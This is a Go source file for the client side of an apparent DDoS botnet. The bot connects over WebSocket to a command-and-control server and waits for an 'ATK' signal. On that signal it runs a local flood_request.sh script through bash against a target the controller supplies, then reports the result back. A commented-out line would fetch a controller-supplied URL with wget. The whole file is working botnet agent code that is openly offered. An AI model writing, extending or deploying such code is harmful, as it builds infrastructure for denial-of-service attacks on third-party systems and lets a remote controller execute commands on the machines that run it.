package bot

import (
	"encoding/json"
	"fmt"
	"log"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/gorilla/websocket"
)

type Message struct {
	Payload string `json:"payload"`
	From    string `json:"from"`
}

const (
	SIGNAL_ATK = "ATK"
	SIGNAL_STP = "STP"
)

type Bot struct {
	Addr   string
	Master string
	Conn   *websocket.Conn
}

func NewBot(addr, master string) *Bot {
	return &Bot{Addr: addr, Master: master}
}

// Attempts to establish a WS connection with the C2 layer
func (b *Bot) Connect() error {
	conn, _, err := websocket.DefaultDialer.Dial(b.Master, nil) // For simplicity: C2 treats this as registration
	if err != nil {
		return err // Let's skip retrying connections
	}

	b.Conn = conn
	return nil
}

// Handler function to execute local scripts depending on received signal from C2 layer
func (b *Bot) Execute(fname string, args string) error {
	var errMsg string

	args = strings.TrimSpace(args)
	if args == "" {
		errMsg = fmt.Sprintf("[×] Failed to execute %s: No args received!\n", fname)
		b.Conn.WriteJSON(Message{
			Payload: errMsg,
			From:    b.Addr,
		})

		return fmt.Errorf(errMsg)
	}

	// TODO: Also validate valid address

	cmd := exec.Command("bash", filepath.Join("../scripts", fname), args)
	//cmd := exec.Command("wget", "-qO-", args)
	if output, err := cmd.CombinedOutput(); err != nil {
		errMsg = fmt.Sprintf("[×] Failed during exection of %s: %s\n%s", fname, err, output)
		b.Conn.WriteJSON(Message{
			Payload: errMsg,
			From:    b.Addr,
		})

		return fmt.Errorf(errMsg)
	}

	successMsg := fmt.Sprintf("[✓] Executed %s! Args: %s", fname, args)
	log.Printf(successMsg)
	b.Conn.WriteJSON(Message{
		Payload: successMsg,
		From:    b.Addr,
	})

	return nil
}

// Websocket Loop that continuously listens to signals from the C2 layer, staying active
func (b *Bot) Listen() error {
	defer b.Conn.Close()
	log.Printf("[+] Connected to C2 as %s", b.Addr)

	for {
		_, data, err := b.Conn.ReadMessage()
		if err != nil {
			return err
		}

		var msg Message
		if err := json.Unmarshal(data, &msg); err != nil {
			log.Printf("Invalid message: %v", err)
			continue
		}

		log.Printf("[C] Received: %s", msg.Payload)
		if strings.HasPrefix(msg.Payload, SIGNAL_ATK) {
			if err := b.Execute("flood_request.sh", strings.Split(msg.Payload, SIGNAL_ATK)[1]); err != nil {
				log.Printf(err.Error())
			}
		}
	}
}

func (b *Bot) Run() error {
	if err := b.Connect(); err != nil {
		return err
	}

	return b.Listen()
}
